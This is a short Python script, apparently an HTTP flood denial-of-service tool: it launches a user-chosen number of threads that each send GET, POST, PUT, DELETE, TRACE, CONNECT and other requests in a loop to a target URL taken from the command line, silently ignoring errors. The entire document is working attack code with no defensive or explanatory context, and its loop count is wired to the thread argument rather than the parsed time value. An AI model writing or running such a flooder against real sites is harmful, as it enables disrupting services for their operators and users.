import requests,threading,sys
from MODEL.data import read

def flood(tar,time):
    for _ in range(time):
     if read() == True:break
     try:[requests.Session().send(requests.Request(method=a,url=tar).prepare()) for a in ['GET','POST','PUT','PATCH','OPTIONS','DELETE','HEAD','TRACE','CONNECT']]
     except:pass

link = sys.argv[1]
thread = int(sys.argv[2])
time = int(sys.argv[3])

[threading.Thread(target=flood,args=(link,thread)).start() for _ in range(thread)]
